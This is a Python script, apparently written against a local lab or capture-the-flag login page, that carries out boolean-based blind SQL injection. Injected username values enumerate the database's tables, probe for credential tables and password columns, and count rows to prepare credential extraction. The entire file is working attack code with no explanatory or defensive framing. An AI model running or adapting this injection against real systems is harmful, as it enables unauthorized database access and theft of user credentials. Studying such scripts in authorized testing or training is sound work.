import requests
import time

base_url = "http://127.0.0.1:33038/index.php"
session_cookie = {"PHPSESSID": "ucv4hujhocgopm34cbotf0aitf"}

def send_payload(payload):
    data = {
        "username": payload,
        "password": "dummy",
        "submit": "Login"
    }
    try:
        response = requests.post(base_url, data=data, cookies=session_cookie, timeout=10)
        return '{"response":"password"}' in response.text
    except:
        return None

# Enumerate all tables in the database
print("[*] Enumerating all tables in the database...")

# First, get the count of tables
print("\n[*] Finding number of tables...")
for i in range(1, 50):
    payload = f"' or (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())={i}-- -"
    if send_payload(payload):
        print(f"[+] Database has {i} tables")
        table_count = i
        break
    time.sleep(0.1)

# Get table names
print("\n[*] Extracting table names...")
table_names = []

# Common table names to check
common_tables = ['users', 'user', 'admin', 'admins', 'accounts', 'account', 'login', 'logins', 'credentials', 'member', 'members']
for table in common_tables:
    payload = f"' or EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='{table}')-- -"
    if send_payload(payload):
        table_names.append(table)
        print(f"[+] Table found: {table}")
    time.sleep(0.1)

print(f"\n[+] All table names: {table_names}")

# Check each table for columns
for table in table_names:
    print(f"\n[*] Checking columns in table '{table}'...")
    cols = []
    for col in ['id', 'username', 'password', 'email', 'user', 'pass', 'admin', 'name', 'value']:
        payload = f"' or EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{table}' AND COLUMN_NAME='{col}')-- -"
        if send_payload(payload):
            cols.append(col)
            print(f"  - Column found: {col}")
        time.sleep(0.1)
    
    if 'username' in cols or 'user' in cols:
        # Try to extract credentials from this table
        user_col = 'username' if 'username' in cols else 'user'
        pass_col = 'password' if 'password' in cols else ('pass' if 'pass' in cols else 'value')
        
        # Count users
        for count in range(1, 10):
            payload = f"' or (SELECT COUNT(*) FROM {table})={count}-- -"
            if send_payload(payload):
                print(f"  - {count} row(s) in table")
                break
            time.sleep(0.1)

